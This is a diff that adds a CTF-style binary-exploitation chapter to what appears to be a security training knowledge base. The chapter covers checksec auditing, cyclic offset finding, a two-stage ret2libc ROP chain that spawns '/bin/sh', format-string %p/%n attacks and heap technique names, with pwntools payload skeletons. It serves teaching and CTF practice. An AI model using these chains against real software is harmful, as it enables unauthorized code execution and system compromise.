@@ -335,3 +335,158 @@ print("[+] Generated Payload:", payload)
         "mitigation": "Always supply static string literals as the format parameter (`printf(\"%s\", buf)`). Compile with `-Wformat -Wformat-security -Werror=format-security` to catch format string bugs at build time."
     }
 }
+
+chapters['pwn-start-to-end'] = {'id': 'pwn-start-to-end',
+ 'domain': 'pwn',
+ 'category': 'Binary Exploitation',
+ 'title': 'The Complete Binary Exploitation Playbook: From Checksec & Stack Overflow to ROP, '
+          'Ret2Libc & Heap Triage',
+ 'subtitle': 'Complete Challenge Lifecycle: Mitigation Audit -> Cyclic Crash & Offset -> Primitive '
+             'Selection Matrix (Ret2win/Ret2libc/Shellcode/Format-Strings) -> Remote Pwntools '
+             'Exploit',
+ 'diagram': '[CHALLENGE BINARY + LIBC.SO.6]\n'
+            '          |\n'
+            '          v\n'
+            '[PHASE 1: MITIGATION RECON (checksec)]\n'
+            '  |-- Canary: NO  -> Stack buffer overflow can overwrite return address directly\n'
+            '  |-- NX:     NO  -> Execute shellcode directly on the stack ($rsp)\n'
+            '  |-- PIE:    NO  -> Binary code addresses are static (e.g. 0x401156)\n'
+            '  `-- RELRO:  Partial -> GOT overwrite is viable via format string or write '
+            'primitive\n'
+            '          |\n'
+            '          v\n'
+            '[PHASE 2: VULNERABILITY & OFFSET TRIAGE (GDB + GEF)]\n'
+            '  |-- Detect unsafe input: gets(buf), read(0, buf, 0x1000), scanf("%s", buf)\n'
+            '  |-- Generate cyclic pattern: gef> pattern create 200\n'
+            '  |-- Run & Crash: gef> r < <(python3 -c "print(\'...\')")\n'
+            '  `-- Compute exact return offset: gef> pattern offset $rsp (e.g. 72 bytes)\n'
+            '          |\n'
+            '          v\n'
+            '[PHASE 3: EXPLOIT PRIMITIVE SELECTION]\n'
+            '  |-- Case A: NX=Disabled, PIE=Disabled  --> Shellcode on stack + jmp rsp\n'
+            '  |-- Case B: NX=Enabled,  win() exists  --> Ret2win (72 bytes + p64(win_addr))\n'
+            '  |-- Case C: NX=Enabled,  No win()      --> Ret2libc (Leak puts@got -> Libc base -> '
+            'system("/bin/sh"))\n'
+            '  |-- Case D: Format string printf(buf)  --> %p memory leak & %n GOT overwrite\n'
+            '  `-- Case E: Heap UAF / Double Free     --> Tcache poisoning & __malloc_hook '
+            'overwrite\n'
+            '          |\n'
+            '          v\n'
+            '[PHASE 4: REMOTE PWNTOOLS SCRIPT GENERATION & EXECUTION]\n'
+            '  `-- from pwn import *; io = remote(HOST, PORT); io.sendline(payload); '
+            'io.interactive()',
+ 'theory': 'Binary exploitation (Pwn) is the art of subverting compiled software execution flow by '
+           'manipulating processor registers, stack frames, or heap metadata to execute arbitrary '
+           'instructions or spawn an interactive shell (`/bin/sh`).\n'
+           '\n'
+           '### PHASE 1: THE MITIGATION MATRIX & ATTACK VECTOR SELECTION\n'
+           'Every pwn challenge begins with `checksec --file=binary`. The active mitigations '
+           'determine the exploit technique:\n'
+           '1. **Stack Canary (`fstack-protector`)**:\n'
+           '   - `No Canary`: Buffer overflows on the stack can directly overwrite the saved '
+           'Return Address (`$rip` / `$eip`).\n'
+           '   - `Canary Found`: A random 8-byte guard value (ending in `\\x00` to prevent string '
+           'function leaks) sits between local buffers and the saved base pointer. You must either '
+           '(a) leak the canary via a format string or info disclosure, (b) overwrite adjacent '
+           'variables without touching the canary, or (c) brute-force byte-by-byte in forking '
+           'servers.\n'
+           '2. **NX (No-Execute / W^X - Write XOR Execute)**:\n'
+           '   - `NX Disabled`: The stack/heap is executable. You can place raw shellcode in your '
+           'payload and redirect `$rip` directly to it.\n'
+           '   - `NX Enabled`: Code cannot be executed from stack memory. You MUST use '
+           'Return-Oriented Programming (ROP) or Return-to-Libc (Ret2libc).\n'
+           '3. **PIE (Position Independent Executable)**:\n'
+           "   - `No PIE`: The binary's `.text`, `.plt`, and `.got` sections are mapped to fixed "
+           'virtual memory addresses (typically `0x400000` on 64-bit Linux). All functions, '
+           'gadgets, and PLT stubs have constant addresses.\n'
+           '   - `PIE Enabled`: All binary sections are randomized by ASLR at runtime. You must '
+           'leak an address from the binary to compute the randomized base address (`binary_base = '
+           'leaked_addr - offset`).\n'
+           '4. **RELRO (Relocation Read-Only)**:\n'
+           '   - `Partial RELRO`: The Global Offset Table (`.got.plt`) remains writable. You can '
+           'overwrite function pointers (e.g., replacing `exit@got` with `win()`).\n'
+           '   - `Full RELRO`: The GOT is marked read-only after dynamic link resolution. Function '
+           'pointer overwrites must target stack frames, heap function pointers, or libc hooks.\n'
+           '\n'
+           '### PHASE 2: CRASH REPRODUCTION & EXACT OFFSET CALCULATION\n'
+           'To control the instruction pointer (`$rip`), you must know the exact number of padding '
+           'bytes between your buffer and the return address:\n'
+           '1. Inside GDB with GEF:\n'
+           '   `gef> pattern create 200`\n'
+           '2. Copy the generated de Bruijn cyclic string (e.g., `aaaabaaacaaadaaa...`).\n'
+           '3. Run the binary with the cyclic pattern:\n'
+           '   `gef> r <<< "aaaabaaacaaadaaa..."`\n'
+           '4. When the program crashes with a Segmentation Fault (`SIGSEGV`), inspect the top of '
+           'the stack:\n'
+           '   `gef> pattern offset $rsp` (or `$rip` in 32-bit: `pattern offset $eip`)\n'
+           '5. GEF reports the exact offset: `[+] Found at offset 72 (big-endian search)`.\n'
+           "6. Your payload structure is now known: `payload = b'A' * 72 + p64(target_address)`.\n"
+           '\n'
+           '### PHASE 3: THE RET2LIBC 2-STAGE ROP PLAYBOOK\n'
+           'When NX is enabled and no convenient `win()` or `backdoor()` function exists in the '
+           'binary, you must execute `system("/bin/sh")` from the C standard library '
+           '(`libc.so.6`).\n'
+           'Because ASLR randomizes libc in memory on every run, Ret2libc requires a 2-stage '
+           'exploit:\n'
+           '- **Stage 1 (Libc Address Leak)**:\n'
+           '  1. Call `puts@plt` passing the Global Offset Table entry of `puts` (`puts@got`) as '
+           'its first argument (via `pop rdi; ret` gadget).\n'
+           '  2. Send the execution flow back to `main` so the binary stays alive and accepts a '
+           'second payload.\n'
+           "  3. Read the output: `leaked_puts = u64(io.recvline().strip().ljust(8, b'\\x00'))`.\n"
+           '  4. Calculate the dynamic libc base: `libc_base = leaked_puts - '
+           "libc.symbols['puts']`.\n"
+           '  5. Compute `system` and `/bin/sh` addresses:\n'
+           "     `system_addr = libc_base + libc.symbols['system']`\n"
+           "     `binsh_addr = libc_base + next(libc.search(b'/bin/sh\\x00'))`\n"
+           '- **Stage 2 (Spawning the Shell)**:\n'
+           '  1. Send second payload:\n'
+           "     `payload = b'A' * offset + p64(ret_gadget) + p64(pop_rdi_gadget) + "
+           'p64(binsh_addr) + p64(system_addr)`\n'
+           '  2. (Note: The `ret_gadget` is essential on x86_64 Ubuntu/Debian to align the stack '
+           'to 16 bytes, preventing `do_system` from crashing on `movaps` SSE instructions!)\n'
+           '  3. `io.interactive()` -> Instant root shell!\n'
+           '\n'
+           '### PHASE 4: FORMAT STRING EXPLOITATION (%p & %n)\n'
+           'When user input is passed directly to `printf(user_input)` without a format string '
+           'specifier:\n'
+           '- Leak arbitrary memory: `%p.%p.%p.%p` prints stack values. `%7$p` prints the 7th '
+           'argument directly.\n'
+           '- Leak libc/canary: Find which stack offset holds the canary (look for hex ending in '
+           '`00`) and libc return address.\n'
+           '- Arbitrary Write: `%n` writes the number of bytes printed so far into a pointer '
+           'provided as an argument. Use Pwntools `fmtstr_payload(offset, {target_got: '
+           'win_function})` to automate arbitrary memory overwrites without manual byte math.',
+ 'commands': [{'cmd': 'checksec --file=challenge',
+               'why': 'Audits active binary defenses: Canary, NX, PIE, RELRO, and Fortify source.',
+               'when': 'Immediate first step before attempting any memory corruption attack.',
+               'internals': 'Examines ELF segment headers (`PT_GNU_STACK`, `PT_GNU_RELRO`) and '
+                            'dynamic symbol entries.',
+               'pitfalls': 'Verify whether ASLR is enabled globally on the system (`cat '
+                           '/proc/sys/kernel/randomize_va_space`).'},
+              {'cmd': 'ROPgadget --binary challenge --only "pop|ret"',
+               'why': 'Extracts reusable assembly snippets (gadgets) ending in `ret` for ROP chain '
+                      'construction.',
+               'when': 'Exploiting 64-bit binaries with NX enabled to configure registers before '
+                       'calling functions.',
+               'internals': 'Scans the executable `.text` segment for machine code byte sequences '
+                            'corresponding to `pop rdi; ret` (`5f c3`).',
+               'pitfalls': 'Ensure gadgets do not point into memory sections marked non-executable '
+                           'or writable.'},
+              {'cmd': 'gef> pattern create 200 && gef> pattern offset $rsp',
+               'why': 'Generates a cyclic non-repeating de Bruijn sequence and calculates the '
+                      'exact crash offset to the return address.',
+               'when': 'Determining exact buffer padding size during stack buffer overflow triage.',
+               'internals': 'Analyzes the unique 8-byte substring stored in `$rsp` or `$rip` when '
+                            'a segmentation fault occurs.',
+               'pitfalls': 'On x86_64, `$rip` is only overwritten if the address is canonical '
+                           '(48-bit address space); inspect `$rsp` if `$rip` shows uncorrupted.'},
+              {'cmd': 'python3 -c "from pwn import *; elf = ELF(\'./challenge\'); libc = '
+                      'ELF(\'./libc.so.6\'); print(hex(elf.plt[\'puts\']))"',
+               'why': 'Automates ELF symbol parsing, PLT/GOT lookups, and format string payload '
+                      'generation using Pwntools.',
+               'when': 'Developing weaponized local and remote CTF exploit scripts.',
+               'internals': 'Pwntools parses ELF headers into structured Python dictionaries with '
+                            'automatic endianness and pointer size handling.',
+               'pitfalls': 'Ensure the remote libc version matches local testing; use `pwninit` to '
+                           'patch binaries to the challenge libc.'}]}
